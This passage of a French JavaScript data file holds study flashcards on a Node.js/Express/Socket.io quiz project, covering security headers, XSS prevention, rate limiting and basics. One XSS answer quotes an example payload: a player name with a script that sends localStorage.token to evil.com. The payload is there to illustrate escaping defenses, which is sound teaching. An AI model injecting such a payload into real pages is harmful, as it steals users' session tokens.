// Protection 3 : HTTPS en production → token chiffré en transit
// Protection 4 : sanitizeStr() côté Socket.io → pas d'injection via les noms de joueurs</pre>
<p>En développement local, le risque XSS est faible. En production publique, on ajouterait le flag <code>httpOnly</code> sur le cookie pour rendre le token inaccessible depuis JavaScript.</p>`,freq:"med",},
  {id:"p2_34",proj:"p2",num:34,category:`Helmet.js & Sécurité HTTP`,thematique:"",question:`Qu'est-ce qu'un header HTTP de sécurité ? Donnez 3 exemples concrets.`,answer:`<p>Un header HTTP de sécurité est une instruction envoyée par le serveur dans sa réponse pour dire au navigateur comment se comporter face à certains risques.</p>
<pre>HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff</pre>
<p><b>Content-Security-Policy (CSP)</b> : liste les sources autorisées pour les scripts, images, etc. Bloque les scripts injectés par XSS qui viendraient d'un domaine inconnu.</p>
<p><b>X-Frame-Options: SAMEORIGIN</b> : empêche votre site d'être intégré dans une <code>&lt;iframe&gt;</code> sur un autre domaine. Protège contre le <em>clickjacking</em> (superposer une iframe invisible pour piéger les clics).</p>
<p><b>X-Content-Type-Options: nosniff</b> : interdit au navigateur de "deviner" le type d'un fichier. Sans lui, un fichier texte contenant du HTML pourrait être exécuté comme HTML.</p>
<p>Helmet.js active tout ça en une ligne : <code>app.use(helmet())</code>.</p>`,freq:"med",},
  {id:"p2_35",proj:"p2",num:35,category:`Helmet.js & Sécurité HTTP`,thematique:"",question:`Qu'est-ce qu'une attaque XSS et comment l'avez-vous prévenue ?`,answer:`<p>XSS (Cross-Site Scripting) : un attaquant injecte du code JavaScript malveillant dans une page. Quand les autres utilisateurs chargent cette page, le script s'exécute dans leur navigateur — il peut voler leur token JWT, rediriger vers un faux site, etc.</p>
<pre>// Scénario d'attaque : un joueur saisit ce nom
// "Alice&lt;script&gt;fetch('https://evil.com?t='+localStorage.token)&lt;/script&gt;"

// ❌ DANGEREUX — innerHTML sans échappement
container.innerHTML = \`Bienvenue \${playerName}\`;
// → Le script s'exécute et vole le token de tous les joueurs

// ✅ VOTRE PROTECTION — fonction esc() avant tout innerHTML
container.innerHTML = \`Bienvenue \${esc(playerName)}\`;
// → Affiche littéralement le texte &lt;script&gt;... sans l'exécuter

// ✅ Côté Socket.io — sanitizeStr() nettoie les noms à la réception
function sanitizeStr(str) {
    return String(str).replace(/[&lt;&gt;"'\`]/g, '').trim().slice(0, 30);
}</pre>
<p>Double protection : <code>sanitizeStr()</code> côté serveur (nettoyage à l'entrée) + <code>esc()</code> côté client (échappement à l'affichage).</p>`,freq:"hot",},
  {id:"p2_36",proj:"p2",num:36,category:`express-rate-limit — Approfondissement`,thematique:"",question:`Qu'est-ce qu'une attaque par force brute et comment le rate limiting la bloque-t-il ?`,answer:`<p>Une attaque par force brute consiste à essayer des milliers de mots de passe à la suite en espérant tomber sur le bon. Sans protection, un script peut faire 1000 tentatives à la seconde.</p>
<pre>// Configuration dans votre projet
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // Fenêtre de 15 minutes
    max: 10,                    // Max 10 tentatives par IP sur cette fenêtre
    skipSuccessfulRequests: true, // Les connexions réussies ne comptent pas
    message: { error: 'Trop de tentatives. Réessayez dans 15 minutes.' }
});

app.post('/api/v1/auth/login', loginLimiter, handleLogin);</pre>
<p>Avec cette configuration, un attaquant doit attendre 15 minutes après 10 échecs. Pour tester un million de mots de passe, il lui faudrait 25 ans. Bcrypt (12 rounds) ralentit encore davantage : chaque tentative prend ~300ms côté serveur.</p>`,freq:"hot",},
  {id:"p2_37",proj:"p2",num:37,category:`express-rate-limit — Approfondissement`,thematique:"",question:`Quelle est la différence entre <code>dependencies</code> et <code>devDependencies</code> dans <code>package.json</code> ?`,answer:`<p><code>dependencies</code> : bibliothèques nécessaires au fonctionnement de l'application en production (Express, Socket.io, bcrypt…).<br/>
<code>devDependencies</code> : bibliothèques uniquement nécessaires pendant le développement, jamais déployées (Jest, Supertest, ESLint…).</p>
<pre>// Installation en production (pas de devDeps)
npm install --omit=dev

// Installation complète pour développer
npm install

// Dans votre package.json
"dependencies": {
    "express":          "^4.18.0",
    "socket.io":        "^4.7.0",
    "better-sqlite3":   "^9.4.0",
    "helmet":           "^8.0.0",
    "express-rate-limit":"^7.2.0",
    "jsonwebtoken":     "^9.0.0",
    "bcryptjs":         "^2.4.0"
},
"devDependencies": {
    "jest":      "^30.0.0",
    "supertest": "^7.0.0",
    "pkg":       "^5.8.0"
}</pre>`,freq:"easy",},
  {id:"p2_38",proj:"p2",num:38,category:`pkg (Vercel) — Approfondissement`,thematique:"",question:`Comment pkg embarque-t-il les fichiers statiques du dossier <code>public/</code> ?`,answer:`<p>pkg crée un "snapshot" virtuel du système de fichiers à l'intérieur du binaire. Pour que les fichiers HTML, CSS et JS du dossier <code>public/</code> soient accessibles, ils doivent être déclarés dans <code>package.json</code> sous la clé <code>pkg.assets</code>.</p>
<pre>// package.json — configuration pkg
"pkg": {
    "assets": [
        "public/**/*",      // Tous les fichiers HTML, CSS, JS, images
        "data/*.db"         // La base SQLite initiale (optionnel)
    ],
    "targets": ["node18-win-x64", "node18-macos-arm64", "node18-linux-x64"]
}

// Dans server.js — Express sert ces fichiers statiques
app.use(express.static(path.join(__dirname, 'public')));
// pkg résout __dirname vers le snapshot virtuel automatiquement</pre>
<p>Résultat : l'exécutable contient Node.js + tout le code + tous les assets. Une seule personne peut faire tourner le serveur de quiz en double-cliquant sur le <code>.exe</code>, sans installer quoi que ce soit.</p>`,freq:"med",},
  {id:"p2_39",proj:"p2",num:39,category:`pkg (Vercel) — Approfondissement`,thematique:"",question:`Quelle est la différence entre <code>require()</code> et <code>import</code> en JavaScript ?`,answer:`<p>Ce sont deux systèmes de modules différents :</p>
<ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
<li><b>CommonJS (<code>require</code>)</b> : le système historique de Node.js — synchrone, fonctionne partout</li>
<li><b>ES Modules (<code>import</code>)</b> : le standard moderne JavaScript — asynchrone, utilisable dans les navigateurs</li>
</ul>
<pre>// CommonJS (côté serveur Node.js — vos fichiers src/)
const express  = require('express');
const { calcScore } = require('./utils/gameHelpers');
module.exports = router;

// ES Modules (côté navigateur — vos fichiers public/js/)
import { myName, myCode } from './mp-state.js';
import { renderQuestion } from './mp-ui.js';
export function resetToLobby() { ... }</pre>
<p>Dans votre projet, vous utilisez les deux : CommonJS côté serveur (Node.js, compatibilité pkg) et ES Modules côté front-end (standard navigateur moderne, meilleur découpage en 7 modules).</p>`,freq:"med",},
  {id:"p2_40",proj:"p2",num:40,category:`pkg (Vercel) — Approfondissement`,thematique:"",question:`Comment avez-vous sécurisé les données côté Socket.io contre l'injection ?`,answer:`<p>Toutes les données reçues via Socket.io viennent des clients — elles ne sont jamais fiables. Trois niveaux de validation ont été appliqués :</p>
<pre>// Niveau 1 : sanitizeStr() — nettoie les chaînes reçues
// Retire les caractères HTML dangereux, limite la longueur à 30 car.
function sanitizeStr(str) {
    return String(str).replace(/[&lt;&gt;"'\`]/g, '').trim().slice(0, 30);
}

// Niveau 2 : isValidCode() — valide le format du code de salle
function isValidCode(code) {
    return /^\\d{4}$/.test(code);  // Exactement 4 chiffres
}

// Niveau 3 : sanitizeAvatarId() — valide l'ID d'avatar
function sanitizeAvatarId(id) {
    const n = parseInt(id, 10);
    return (Number.isInteger(n) &amp;&amp; n &gt;= 0 &amp;&amp; n &lt;= 15) ? n : 0;
}

// Application à chaque réception de données
socket.on('join_room', ({ code, name, avatarId }) =&gt; {
    const safeCode   = sanitizeStr(code);
    const safeName   = sanitizeStr(name);
    const safeAvatar = sanitizeAvatarId(avatarId);
    if (!isValidCode(safeCode)) return socket.emit('join_error', {...});
    // Suite du traitement avec données validées
});</pre>
<p>Principe général : ne jamais faire confiance aux données entrantes — toujours valider et nettoyer avant de les utiliser.</p>`,freq:"med",},
  {id:"p2_new_1",proj:"p2",num:1,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Qu'est-ce que Node.js ?`,answer:`<p>Node.js est un <b>environnement d'exécution JavaScript côté serveur</b>, basé sur le moteur V8 de Chrome. Il permet d'exécuter du JavaScript en dehors du navigateur, pour créer des serveurs, des scripts système, ou des outils CLI.</p>
<pre>node --version  # Affiche la version installée (ex: v18.17.1)
</pre>`,freq:"hot",},
  {id:"p2_new_2",proj:"p2",num:2,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment installer Node.js sur son ordinateur ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Télécharge l'installateur <b>LTS</b> (Long Term Support) depuis nodejs.org.</li>
<li>Exécute l'installateur (inclut <code>node</code> et <code>npm</code>).</li>
<li>Vérifie l'installation :</li>
<pre>node -v  # Version de Node.js
npm -v   # Version de npm
</pre>
</ul>`,freq:"easy",},
  {id:"p2_new_3",proj:"p2",num:3,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`À quoi sert le LTS (Long Term Support) ?`,answer:`<p>Les versions <b>LTS</b> (ex: 18.x, 20.x) sont <b>stables, maintenues pendant 30 mois</b>, et recommandées pour la production. Elles reçoivent des mises à jour de sécurité et de compatibilité.</p>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Version <b>18.17.1 LTS</b> → Support jusqu'en <b>avril 2025</b>.</li>
<li>Version <b>20.x</b> (dernière LTS) → Support jusqu'en <b>avril 2026</b>.</li>
</ul>`,freq:"easy",},
  {id:"p2_new_4",proj:"p2",num:4,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment exécuter un fichier JavaScript avec Node.js ?`,answer:`<p>Utilise la commande <code>node</code> suivie du chemin vers ton fichier :</p>
<pre>node monScript.js
</pre>
<p>Exemple (<code>monScript.js</code>) :</p>
<pre>console.log("Bonjour depuis Node.js !");
</pre>`,freq:"easy",},
  {id:"p2_new_5",proj:"p2",num:5,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Qu'est-ce que \`npm\` et à quoi sert-il ?`,answer:`<code>npm</code> (Node Package Manager) est le <b>gestionnaire de paquets</b> de Node.js. Il permet :
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>D'installer des bibliothèques (ex: <code>npm install express</code>).</li>
<li>De gérer les dépendances d'un projet (via <code>package.json</code>).</li>
<li>De lancer des scripts (ex: <code>npm start</code>).</li>
</ul>`,freq:"hot",},
  {id:"p2_new_6",proj:"p2",num:6,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment créer un projet Node.js avec \`npm init\` ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Crée un dossier pour ton projet :</li>
<pre>mkdir mon-projet &amp;&amp; cd mon-projet
</pre>
<li>Initialise le projet :</li>
<pre>npm init -y  # Génère un package.json par défaut
</pre>
</ul>
<b>Résultat</b> : Un fichier <code>package.json</code> est créé avec les métadonnées du projet.`,freq:"easy",},
  {id:"p2_new_7",proj:"p2",num:7,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Qu'est-ce que le fichier \`package.json\` ?`,answer:`<p>Fichier de configuration qui contient les <b>métadonnées</b> du projet (nom, version), les <b>dépendances</b> (<code>dependencies</code> / <code>devDependencies</code>) et les <b>scripts</b>.</p>
<pre>{
  "name": "mon-projet",
  "version": "1.0.0",
  "scripts": { "start": "node app.js" },
  "dependencies": { "express": "^4.18.2" }
}
</pre>`,freq:"hot",},
  {id:"p2_new_8",proj:"p2",num:8,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment installer une dépendance avec \`npm\` ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Pour une dépendance de <b>production</b> :</li>
<pre>npm install express
</pre>
<li>Pour une dépendance de <b>développement</b> (ex: Jest) :</li>
<pre>npm install --save-dev jest
</pre>
</ul>
<b>Résultat</b> : Le package est ajouté dans <code>node_modules/</code> et <code>package.json</code>.`,freq:"hot",},
  {id:"p2_new_9",proj:"p2",num:9,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Qu'est-ce que \`node_modules\` et \`.gitignore\` ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b><code>node_modules/</code></b> : Dossier où <code>npm</code> installe toutes les dépendances.</li>
<li><b><code>.gitignore</code></b> : Fichier pour exclure <code>node_modules/</code> du dépôt Git (car il peut peser plusieurs Go).</li>
<pre>node_modules/
.env
</pre>
</ul>`,freq:"easy",},
  {id:"p2_new_10",proj:"p2",num:10,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment utiliser le module \`fs\` pour lire un fichier ?`,answer:`<p>Le module <b><code>fs</code></b> (File System) permet de lire/écrire des fichiers.</p>
<p>Lecture synchrone :</p>
<pre>const fs = require('fs');
const data = fs.readFileSync('fichier.txt', 'utf8');
console.log(data);
</pre>
<p>Lecture asynchrone :</p>
<pre>fs.readFile('fichier.txt', 'utf8', (err, data) =&gt; {
  if (err) throw err;
  console.log(data);
});
</pre>`,freq:"med",},
  {id:"p2_new_11",proj:"p2",num:11,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment écrire dans un fichier avec \`fs\` ?`,answer:`<pre>const fs = require('fs');
fs.writeFileSync('fichier.txt', 'Bonjour DWWM !', 'utf8');
</pre>
<p>Version asynchrone :</p>
<pre>fs.writeFile('fichier.txt', 'Bonjour DWWM !', 'utf8', (err) =&gt; {
  if (err) throw err;
  console.log('Fichier écrit avec succès !');
});
</pre>`,freq:"med",},
  {id:"p2_new_12",proj:"p2",num:12,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Qu'est-ce que \`process.argv\` ?`,answer:`<p>Tableau contenant les <b>arguments passés en ligne de commande</b> à Node.js.</p>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><code>process.argv[0]</code> : Chemin vers Node.js.</li>
<li><code>process.argv[1]</code> : Chemin vers le script exécuté.</li>
<li><code>process.argv[2]</code> : Premier argument personnalisé.</li>
<pre>// node script.js arg1 arg2
console.log(process.argv);
// ['/usr/bin/node', '/chemin/script.js', 'arg1', 'arg2']
</pre>
</ul>`,freq:"med",},
  {id:"p2_new_13",proj:"p2",num:13,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment créer un serveur HTTP basique avec Node.js ?`,answer:`<p>Utilise le module natif <b><code>http</code></b> :</p>
<pre>const http = require('http');
const server = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bonjour depuis Node.js !');
});
server.listen(3000, () =&gt; {
  console.log('Serveur sur http://localhost:3000');
});
</pre>`,freq:"med",},
  {id:"p2_new_14",proj:"p2",num:14,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Qu'est-ce qu'un module en Node.js ?`,answer:`<p>Un <b>module</b> est un fichier JavaScript qui exporte des fonctions ou variables pour être réutilisés.</p>
<pre>// math.js — export
module.exports.add = (a, b) =&gt; a + b;

// app.js — import
const math = require('./math.js');
console.log(math.add(2, 3));  // 5
</pre>`,freq:"hot",},
  {id:"p2_new_15",proj:"p2",num:15,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Qu'est-ce que \`require\` et \`module.exports\` ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b><code>require</code></b> : Importe un module (fichier ou package npm).</li>
<li><b><code>module.exports</code></b> : Exporte des variables/fonctions depuis un module.</li>
<pre>// module.js
module.exports = { foo: 'bar' };

// app.js
const m = require('./module.js');
console.log(m.foo);  // 'bar'
</pre>
</ul>`,freq:"hot",},
  {id:"p2_new_16",proj:"p2",num:16,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment gérer les erreurs avec \`try/catch\` ?`,answer:`<pre>try {
  const data = fs.readFileSync('fichierInexistant.txt', 'utf8');
} catch (err) {
  console.error('Erreur :', err.message);
  // "ENOENT: no such file or directory"
}
</pre>`,freq:"hot",},
  {id:"p2_new_17",proj:"p2",num:17,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Qu'est-ce qu'une Promise en Node.js ?`,answer:`<p>Une <b>Promise</b> représente une opération <b>asynchrone</b> qui peut réussir (<code>resolve</code>) ou échouer (<code>reject</code>).</p>
<pre>const fs = require('fs').promises;

fs.readFile('fichier.txt', 'utf8')
  .then((data) =&gt; console.log(data))
  .catch((err) =&gt; console.error('Erreur :', err));
</pre>`,freq:"hot",},
  {id:"p2_new_18",proj:"p2",num:18,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment utiliser \`async/await\` avec les Promises ?`,answer:`<code>async/await</code> simplifie la gestion des Promises — le code se lit comme du code synchrone.
<pre>const fs = require('fs').promises;

async function lireFichier() {
  try {
    const data = await fs.readFile('fichier.txt', 'utf8');
    console.log(data);
  } catch (err) {
    console.error('Erreur :', err);
  }
}
lireFichier();
</pre>`,freq:"hot",},
  {id:"p2_new_19",proj:"p2",num:19,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Qu'est-ce que le module \`path\` ?`,answer:`<p>Le module <b><code>path</code></b> permet de manipuler les chemins de fichiers de manière <b>multiplateforme</b> (Windows, Linux, macOS).</p>
<pre>const path = require('path');
// Jointure de chemins
path.join('dossier', 'sous-dossier', 'fichier.txt');
// → dossier/sous-dossier/fichier.txt

// Chemin absolu
path.resolve('fichier.txt');
// → /chemin/absolu/fichier.txt
</pre>`,freq:"med",},
  {id:"p2_new_20",proj:"p2",num:20,category:`Node.js 18+ LTS`,thematique:`Node.js`,question:`Comment utiliser les variables d'environnement avec \`process.env\` ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Crée un fichier <code>.env</code> :</li>
<pre>DB_HOST=localhost
DB_USER=root
</pre>
<li>Installe le package <code>dotenv</code> : <code>npm install dotenv</code></li>
<li>Charge les variables :</li>
<pre>require('dotenv').config();
console.log(process.env.DB_HOST);  // 'localhost'
</pre>
</ul>
<b>⚠️ Important</b> : Ajoute <code>.env</code> dans <code>.gitignore</code> !`,freq:"hot",},
  {id:"p2_new_21",proj:"p2",num:21,category:`Express.js 4.18`,thematique:`Express.js`,question:`Qu'est-ce qu'Express.js ?`,answer:`<p>Express est un <b>framework minimaliste</b> pour Node.js, qui simplifie la création de <b>serveurs HTTP</b> et d'<b>API REST</b>. Il gère les routes, les middlewares, et les requêtes/réponses.</p>`,freq:"hot",},
  {id:"p2_new_22",proj:"p2",num:22,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment installer Express.js ?`,answer:`<pre>npm install express
</pre>
<p>Puis crée un fichier <code>app.js</code> :</p>
<pre>const express = require('express');
const app = express();
app.listen(3000, () =&gt; console.log('Serveur sur http://localhost:3000'));
</pre>`,freq:"easy",},
  {id:"p2_new_23",proj:"p2",num:23,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment créer une route GET basique ?`,answer:`<pre>app.get('/', (req, res) =&gt; {
  res.send('Bonjour depuis Express !');
});
</pre>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><code>req</code> : Objet <b>requête</b> (headers, params, body).</li>
<li><code>res</code> : Objet <b>réponse</b> (<code>send()</code>, <code>json()</code>, <code>status()</code>).</li>
</ul>`,freq:"hot",},
  {id:"p2_new_24",proj:"p2",num:24,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment créer une route POST ?`,answer:`<pre>app.use(express.json());  // Parser le body JSON
app.post('/users', (req, res) =&gt; {
  console.log(req.body);  // Données envoyées en JSON
  res.json({ user: req.body });
});
</pre>`,freq:"hot",},
  {id:"p2_new_25",proj:"p2",num:25,category:`Express.js 4.18`,thematique:`Express.js`,question:`Qu'est-ce qu'un middleware dans Express ?`,answer:`<p>Un <b>middleware</b> est une fonction qui intercepte les requêtes/réponses et peut les modifier ou arrêter le cycle.</p>
<pre>app.use((req, res, next) =&gt; {
  console.log(<code>\${req.method} \${req.url}</code>);
  next();  // Passe au middleware suivant
});
</pre>`,freq:"hot",},
  {id:"p2_new_26",proj:"p2",num:26,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment utiliser \`express.static\` pour servir des fichiers statiques ?`,answer:`<pre>app.use(express.static('public'));
// Structure :
// public/index.html → http://localhost:3000/index.html
// public/style.css  → http://localhost:3000/style.css
</pre>`,freq:"med",},
  {id:"p2_new_27",proj:"p2",num:27,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment accéder aux paramètres d'URL (ex: \`/users/:id\`) ?`,answer:`<pre>app.get('/users/:id', (req, res) =&gt; {
  const userId = req.params.id;  // Récupère la valeur de :id
  res.send(<code>ID de l'utilisateur : \${userId}</code>);
});
// URL : /users/123 → req.params.id = "123"
</pre>`,freq:"hot",},
  {id:"p2_new_28",proj:"p2",num:28,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment accéder aux query parameters (ex: \`/users?name=Jean\`) ?`,answer:`<pre>app.get('/users', (req, res) =&gt; {
  const name = req.query.name;
  res.send(<code>Nom : \${name}</code>);
});
// URL : /users?name=Jean → req.query.name = "Jean"
</pre>`,freq:"hot",},
  {id:"p2_new_29",proj:"p2",num:29,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment envoyer une réponse JSON ?`,answer:`<pre>app.get('/api/data', (req, res) =&gt; {
  res.json({ message: 'Données JSON', status: 'OK' });
});
</pre>`,freq:"easy",},
  {id:"p2_new_30",proj:"p2",num:30,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment gérer les erreurs 404 ?`,answer:`<p>Place un middleware <b>à la fin</b> de tes routes :</p>
<pre>app.use((req, res) =&gt; {
  res.status(404).send('Page non trouvée !');
});
</pre>`,freq:"easy",},
  {id:"p2_new_31",proj:"p2",num:31,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment créer un Router pour organiser les routes ?`,answer:`<pre>// routes/users.js
const express = require('express');
const router = express.Router();

router.get('/', (req, res) =&gt; {
  res.send('Liste des utilisateurs');
});
module.exports = router;

// app.js
const userRouter = require('./routes/users');
app.use('/users', userRouter);
</pre>`,freq:"hot",},
  {id:"p2_new_32",proj:"p2",num:32,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment rediriger une requête avec \`res.redirect\` ?`,answer:`<pre>app.get('/old-page', (req, res) =&gt; {
  res.redirect(301, '/new-page');  // Redirection permanente
});
</pre>`,freq:"easy",},
  {id:"p2_new_33",proj:"p2",num:33,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment utiliser les cookies avec Express ?`,answer:`<pre>npm install cookie-parser
</pre>
<pre>const cookieParser = require('cookie-parser');
app.use(cookieParser());

app.get('/set-cookie', (req, res) =&gt; {
  res.cookie('username', 'Jean', { maxAge: 900000, httpOnly: true });
  res.send('Cookie défini !');
});
app.get('/get-cookie', (req, res) =&gt; {
  res.send(<code>Username : \${req.cookies.username}</code>);
});
</pre>`,freq:"med",},
  {id:"p2_new_34",proj:"p2",num:34,category:`Express.js 4.18`,thematique:`Express.js`,question:`Qu'est-ce que \`app.use()\` ?`,answer:`<code>app.use()</code> permet d'appliquer un <b>middleware</b> à toutes les routes ou à un chemin spécifique.
<pre>// Toutes les routes
app.use(express.json());

// Uniquement /api
app.use('/api', (req, res, next) =&gt; {
  console.log('Middleware pour /api');
  next();
});
</pre>`,freq:"hot",},
  {id:"p2_new_35",proj:"p2",num:35,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment gérer les CORS (Cross-Origin Resource Sharing) ?`,answer:`<pre>npm install cors
</pre>
<pre>const cors = require('cors');
app.use(cors());  // Autorise toutes les origines

// Configuration avancée
app.use(cors({
  origin: 'http://mon-site.com',
  methods: ['GET', 'POST']
}));
</pre>`,freq:"med",},
  {id:"p2_new_36",proj:"p2",num:36,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment gérer les requêtes PUT et DELETE ?`,answer:`<pre>app.put('/users/:id', (req, res) =&gt; {
  res.send(<code>Utilisateur \${req.params.id} mis à jour</code>);
});

app.delete('/users/:id', (req, res) =&gt; {
  res.send(<code>Utilisateur \${req.params.id} supprimé</code>);
});
</pre>`,freq:"med",},
  {id:"p2_new_37",proj:"p2",num:37,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment utiliser \`res.status()\` pour définir un code HTTP ?`,answer:`<pre>app.get('/error', (req, res) =&gt; {
  res.status(400).json({ error: 'Mauvaise requête' });
});
</pre>
<p>Codes courants : <code>200</code> OK, <code>201</code> Créé, <code>400</code> Mauvaise requête, <code>401</code> Non autorisé, <code>404</code> Non trouvé, <code>500</code> Erreur serveur.</p>`,freq:"hot",},
  {id:"p2_new_38",proj:"p2",num:38,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment structurer un projet Express de manière professionnelle ?`,answer:`<pre>mon-projet/
├── public/          # Fichiers statiques
├── routes/          # Routes Express (users.js, products.js)
├── controllers/     # Logique métier
├── models/          # Modèles de BDD
├── middlewares/     # Middlewares personnalisés
├── app.js           # Configuration Express
└── .env
</pre>
<pre>// app.js
const userRouter = require('./routes/users');
app.use(express.json());
app.use('/users', userRouter);
</pre>`,freq:"med",},
  {id:"p2_new_39",proj:"p2",num:39,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment gérer les erreurs 404 et 500 dans Express ?`,answer:`<pre>// 404 — à la fin de toutes les routes
app.use((req, res) =&gt; {
  res.status(404).send('Page non trouvée !');
});

// 500 — middleware avec 4 paramètres
app.use((err, req, res, next) =&gt; {
  console.error(err.stack);
  res.status(500).send('Erreur serveur !');
});
</pre>`,freq:"hot",},
  {id:"p2_new_40",proj:"p2",num:40,category:`Express.js 4.18`,thematique:`Express.js`,question:`Comment gérer les fichiers uploadés avec multer ?`,answer:`<pre>npm install multer
</pre>
<pre>const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

app.post('/upload', upload.single('file'), (req, res) =&gt; {
  res.send(<code>Fichier uploadé : \${req.file.originalname}</code>);
});
</pre>`,freq:"easy",},
  {id:"p2_new_41",proj:"p2",num:41,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Qu'est-ce que Socket.io ?`,answer:`<p>Socket.io est une <b>bibliothèque</b> qui permet une <b>communication temps réel bidirectionnelle</b> entre le client et le serveur, en utilisant <b>WebSockets</b> (avec fallback en HTTP long-polling si nécessaire).</p>`,freq:"hot",},
  {id:"p2_new_42",proj:"p2",num:42,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment installer Socket.io ?`,answer:`<pre>npm install socket.io
</pre>`,freq:"easy",},
  {id:"p2_new_43",proj:"p2",num:43,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment créer un serveur Socket.io avec Express ?`,answer:`<pre>const express = require('express');
const { createServer } = require('http');
const { Server } = require('socket.io');

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer);

io.on('connection', (socket) =&gt; {
  console.log('Un client est connecté !');
});

httpServer.listen(3000);
</pre>`,freq:"hot",},
  {id:"p2_new_44",proj:"p2",num:44,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment connecter un client (navigateur) à Socket.io ?`,answer:`<pre>&lt;script src="/socket.io/socket.io.js"&gt;&lt;/script&gt;
&lt;script&gt;
  const socket = io();  // Se connecte à http://localhost:3000
  socket.on('connect', () =&gt; {
    console.log('Connecté au serveur !');
  });
&lt;/script&gt;
</pre>`,freq:"hot",},
  {id:"p2_new_45",proj:"p2",num:45,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment émettre un événement personnalisé depuis le serveur ?`,answer:`<pre>io.on('connection', (socket) =&gt; {
  // À un seul client
  socket.emit('message', 'Bonjour depuis le serveur !');
  // À tous les clients
  io.emit('message', 'Bonjour à tous !');
});
</pre>`,freq:"hot",},
  {id:"p2_new_46",proj:"p2",num:46,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment écouter un événement personnalisé côté client ?`,answer:`<pre>socket.on('message', (data) =&gt; {
  console.log('Message reçu :', data);
});
</pre>`,freq:"hot",},
  {id:"p2_new_47",proj:"p2",num:47,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment émettre un événement depuis le client ?`,answer:`<pre>socket.emit('chatMessage', { user: 'Jean', text: 'Bonjour !' });
</pre>`,freq:"hot",},
  {id:"p2_new_48",proj:"p2",num:48,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment écouter un événement côté serveur ?`,answer:`<pre>io.on('connection', (socket) =&gt; {
  socket.on('chatMessage', (data) =&gt; {
    console.log('Message reçu :', data);
    io.emit('chatMessage', data);  // Diffuse à tous les clients
  });
});
</pre>`,freq:"hot",},
  {id:"p2_new_49",proj:"p2",num:49,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Qu'est-ce qu'une room (salle) dans Socket.io ?`,answer:`<p>Une <b>room</b> permet de <b>grouper des sockets</b> pour envoyer des messages à un sous-ensemble de clients.</p>
<pre>io.on('connection', (socket) =&gt; {
  socket.join('salle1');  // Le client rejoint la salle
  io.to('salle1').emit('message', 'Message pour la salle 1 !');
});
</pre>`,freq:"hot",},
  {id:"p2_new_50",proj:"p2",num:50,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment quitter une room ?`,answer:`<pre>socket.leave('salle1');
</pre>`,freq:"easy",},
  {id:"p2_new_51",proj:"p2",num:51,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment envoyer un message à une room spécifique ?`,answer:`<pre>io.to('salle1').emit('message', 'Bonjour la salle 1 !');
// Ou à tous SAUF l'émetteur :
socket.to('salle1').emit('message', 'Bonjour !');
</pre>`,freq:"hot",},
  {id:"p2_new_52",proj:"p2",num:52,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment savoir dans quelles rooms un socket est connecté ?`,answer:`<pre>io.on('connection', (socket) =&gt; {
  console.log(socket.rooms);
  // Set { socket.id, 'salle1', 'salle2', ... }
});
